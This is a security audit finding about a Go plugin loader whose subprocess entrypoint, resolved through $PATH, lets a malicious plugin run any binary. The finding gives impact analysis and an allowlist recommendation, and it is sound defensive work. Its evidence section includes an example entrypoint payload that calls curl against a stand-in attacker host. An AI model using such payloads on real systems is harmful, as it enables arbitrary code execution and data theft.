# [Medium] Plugin subprocess entrypoint allows command injection via shell metacharacters

**Scope:** Plugin system — trust boundary #5 (Plugin manifests), #6 (Plugin code)
**Topic:** Security
**Date:** 2026-04-11

## Problem

The `parseEntrypoint` function splits the entrypoint string by whitespace and passes the first token to `exec.Command`. While this avoids shell interpretation (Go's `exec.Command` does not invoke a shell), the `exec.LookPath` fallback resolves relative paths from the plugin directory, and the split-by-whitespace approach means a crafted entrypoint with quoted arguments would be mishandled.

However, the entrypoint command is then passed to `exec.LookPath` which follows `$PATH`, meaning a plugin can specify any binary name that exists in `$PATH`.

## Evidence

`internal/plugin/loader.go:L142-L152`:

```go
command, args := parseEntrypoint(m.Entrypoint, dp.Dir)

// Verify the command exists.
if _, err := exec.LookPath(command); err != nil {
    // Try as relative path from plugin dir.
    absCmd := filepath.Join(dp.Dir, command)
    if _, err := exec.LookPath(absCmd); err != nil {
        return nil, fmt.Errorf("entrypoint %q not found: %w", m.Entrypoint, err)
    }
    command = absCmd
}
```

The `LookPath` call resolves against `$PATH`. A plugin with `entrypoint: "python3 -c 'import os; os.system(\"curl evil.com\")'` would fail the whitespace split into `["python3", "-c", "'import", ...]` — the shell quoting is not preserved. But `entrypoint: "python3 exploit.py"` where `exploit.py` is in the plugin directory would work as intended (for the attacker).

The real risk is that any binary on `$PATH` can be invoked. There is no confinement to a specific set of allowed runtimes.

## Impact

A malicious plugin can execute any binary available in `$PATH` as a subprocess. Combined with the full environment inheritance (finding 02/05), this means the subprocess has access to all API keys and can do anything the nanite process user can do.

This is partially mitigated by the fact that installing a plugin requires authenticated API access or manual filesystem placement. The plugin-as-in-process-code (trust boundary #6) is already a design-acknowledged threat — the subprocess entrypoint adds a smaller incremental risk since the plugin could also register arbitrary Go code via the builtin mechanism.

Severity is Medium rather than High because the prerequisite (plugin installation) already grants equivalent access through the in-process plugin code path.

## Recommendation

1. Restrict allowed entrypoint commands to a known set of interpreters (`python3`, `node`, `deno`, `bun`, `./binary-name`) or require the entrypoint to be a path within the plugin directory.
2. Log the resolved absolute path of the entrypoint command at plugin load time for audit trail.

## References

- `internal/plugin/loader.go:L138-L172` — newSubprocessPluginFromManifest
- `internal/plugin/loader.go:L177-L183` — parseEntrypoint
- Cross-ref: finding 01 (manifest validation)
- Cross-ref: finding 05 (subprocess env inheritance)
